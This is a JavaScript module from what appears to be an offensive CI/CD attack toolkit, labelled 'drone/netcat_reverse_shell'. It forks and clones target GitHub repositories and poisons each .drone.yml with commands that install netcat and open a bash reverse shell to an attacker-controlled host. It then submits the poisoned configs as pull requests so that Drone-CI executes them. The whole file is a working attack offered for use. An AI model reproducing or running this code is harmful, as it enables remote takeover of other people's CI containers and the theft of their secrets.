const log = console.log,
chalk = require('chalk'),
green = chalk.green,
cyan = chalk.cyan,
github = require(__dirname + '/../../../lib/gh'),
files = require(__dirname + '/../../../lib/files'),
repos = require(__dirname + '/../../../lib/repos'),
exp = require(__dirname + '/../../../lib/exp'),
drone = require(__dirname + '/../../../modules/drone'),
server = require(__dirname + '/../../../lib/server'),
ng = require(__dirname + '/../../../lib/ng'),
targets = require(__dirname + '/../../../lib/targets'),
repodir = __dirname + '/../../../../repos';

module.exports = {

// This particular run function returns an array of netcat listeners
run: (callback) => {
    exp.exploitMultiHarness('github', 'other', module.exports.type(), module.exports.name(), (err, token, authed_user, raw_targets, ci_targets, hostname_arr, port_arr, server_arr, url_arr) =>{
        if(err){
            return callback(err);
          }
          // Load the .drone.yml file into the repos
          drone.loadDroneConfigAll(module.exports.name(), authed_user, raw_targets, () => {
            const append_promises = [];
    
            // iterate through list of files, find drone configs and append to the file
            for (let t in raw_targets) {
              append_promises.push(new Promise((resolve, reject) => {
                drone.appendDroneConfig(`${repodir}/${raw_targets[t]}/.drone.yml`,
                  `\n      - export NGPORT=${port_arr[t]}\n      - export NGHOSTNAME=${hostname_arr[t]}\n      - apt-get update && apt-get install -y netcat\n      - mknod /tmp/backpipe p\n      - /bin/bash 0</tmp/backpipe|nc $NGHOSTNAME $NGPORT 1>/tmp/backpipe &\n      - while true; do sleep 60; echo "Keepalive"; done `);
                resolve();
              }).catch(err => {
                log(err);
              }));
            }
    
            // Cash in the promises from above
            Promise.all(append_promises)
              .then(c => {
                repos.pullRequestAll(token, 'other', authed_user, raw_targets, () => {
                  return callback();
                });
              });
          });
    })
},

name: () => {
return "drone/netcat_reverse_shell";
},

type: () => {
return "drone";
},

info: (cb) => {
log(cyan("\n---\nINFO\n---\n"));
log((`This exploit takes advantage of open Drone-CI repositories to 
create a netcat connection back to the attacker. The end result
is a shell from which to control the compromised Drone-CI container.\n`));

log(cyan("ORDER OF EXECUTION\n------------------\n"));
log(("1) Fork all targets"));
log(("2) Clone all forked targets locally"));
log(("3) Start shell handler(s)"));
log(("4) Load and poison the .drone.yml file of the cloned repos"));
log(("5) Push commited changes, and submit a pull request"));
return cb();

},

options: () => {
log(green("\n-------\nOPTIONS\n-------\n"));
log(green("NO OPTIONS. This is the 'easy' exploit. No need to set IPs or ports."));
// Print options for exploit
}
}